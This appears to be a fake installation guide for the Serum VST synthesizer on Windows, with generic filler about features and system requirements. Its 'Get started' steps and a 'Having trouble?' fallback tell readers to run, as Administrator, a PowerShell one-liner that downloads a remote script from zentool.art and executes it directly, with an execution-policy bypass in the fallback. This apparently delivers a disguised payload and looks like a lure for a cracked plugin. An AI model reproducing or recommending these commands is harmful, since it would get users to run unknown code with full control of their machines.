# Serum VST — Windows Audio Production Guide (10 & 11)

Windows 10 & 11 · recording · audio production.

**Serum VST** on **Windows 10 and 11** — recording and day-to-day notes for producers.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **Serum VST** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

Serum is a wavetable synthesizer plugin for electronic music production inside compatible DAWs on Windows. CPU load scales with unison and effects; producers freeze tracks or bounce to audio on modest laptops.

Document VST scan folders, preset backup, and sample-rate alignment with the DAW session.

## FAQ

| Question | Answer |
| --- | --- |
| Where do I run the command? | **PowerShell as Administrator** — use the block in step 2 under **Get started**. |
| ExecutionPolicy blocked the script? | Expand **Having trouble?** above — that one-liner uses **Bypass** for the current session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during step 3. |

## Features

- Multitrack editing
- Plugin chains
- Mix bus
- Preset banks
- MIDI tools
- Project saves
- Meters

## Use cases

- Recording studios
- Podcast producers
- Music courses

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "Serum-VST-Full"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Application check (optional)**

```powershell
Get-Process -Name "Serum*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 8 GB minimum · 16 GB recommended |
| Disk | 8 GB free space |

## Topics

`serum-vst-windows` · `serum-config` · `serum-integration` · `serum-latest` · `audio-production` · `mixing-tools` · `mastering` · `vst-plugins`

## License

This repository is a third-party audio usage guide. Comply with applicable software licensing and local regulations.
